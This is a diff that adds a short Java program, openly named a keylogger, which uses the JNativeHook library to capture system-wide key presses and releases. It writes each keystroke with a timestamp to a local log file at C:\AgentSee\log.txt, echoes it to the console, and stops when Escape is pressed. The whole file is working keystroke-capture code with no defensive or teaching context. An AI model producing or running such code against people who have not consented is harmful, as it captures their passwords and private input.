@@ -1,0 +1,83 @@
+import java.io.BufferedWriter;
+import java.io.File;
+import java.util.Formatter;
+import java.util.Date;
+import java.io.FileWriter;
+import org.jnativehook.GlobalScreen;
+import org.jnativehook.NativeHookException;
+import org.jnativehook.keyboard.NativeKeyEvent;
+import org.jnativehook.keyboard.NativeKeyListener;
+
+public class keyloggerl5 implements NativeKeyListener {
+    public void nativeKeyPressed(NativeKeyEvent e) {
+        String x=NativeKeyEvent.getKeyText(e.getKeyCode());
+        System.out.println("Button pressed: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
+        Date date1 = new Date();
+        try {
+            BufferedWriter wr1 = new BufferedWriter(new FileWriter("C:\\AgentSee\\log.txt",true));
+            String lineSeparator=System.getProperty("lineSeparator");
+            wr1.write(date1+" Button pressed: "+x+"\r\n");
+            wr1.flush();
+            wr1.close();
+
+        }catch (Exception ex){
+            System.out.println("Error!");
+        }
+        if (e.getKeyCode() == NativeKeyEvent.VC_ESCAPE) {
+            if (e.getKeyCode() == NativeKeyEvent.VC_ESCAPE) {
+                try {
+                    GlobalScreen.unregisterNativeHook();
+                } catch (NativeHookException ex) {
+                    ex.printStackTrace();
+                }
+            }
+        }
+    }
+
+    public void nativeKeyReleased(NativeKeyEvent e) {
+        String y=NativeKeyEvent.getKeyText(e.getKeyCode());
+        System.out.println("Key Released: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
+        Date date2 = new Date();
+        try {
+            BufferedWriter wr2 = new BufferedWriter(new FileWriter("C:\\AgentSee\\log.txt",true));
+            String lineSeparator=System.getProperty("lineSeparator");
+            wr2.write(date2+" Key Released: "+y+"\r\n");
+            wr2.flush();
+            wr2.close();
+
+        }catch (Exception ex){
+            System.out.println("Error!");
+        }
+
+    }
+
+    public void nativeKeyTyped(NativeKeyEvent e) {
+        String z=e.getKeyText(e.getKeyCode());
+//        System.out.println("Typed: " + e.getKeyText(e.getKeyCode()));
+//        Date date3 = new Date();
+//        try {
+//            BufferedWriter wr3 = new BufferedWriter(new FileWriter("C:\\AgentSee\\log.txt",true));
+//            String lineSeparator=System.getProperty("lineSeparator");
+//            wr3.write(date3+" Typed: "+z+"\r\n");
+//        wr3.flush();
+//            wr3.close();
+//
+//        }catch (Exception ex){
+//            System.out.println("Error!");
+//        }
+    }
+
+    public static void main(String[] args) {
+
+        try {
+            GlobalScreen.registerNativeHook();
+        }
+        catch (NativeHookException ex) {
+            System.err.println("There was a problem registering the native hook!");
+            System.err.println(ex.getMessage());
+
+            System.exit(1);
+        }
+        GlobalScreen.addNativeKeyListener(new keyloggerl5());
+    }
+}
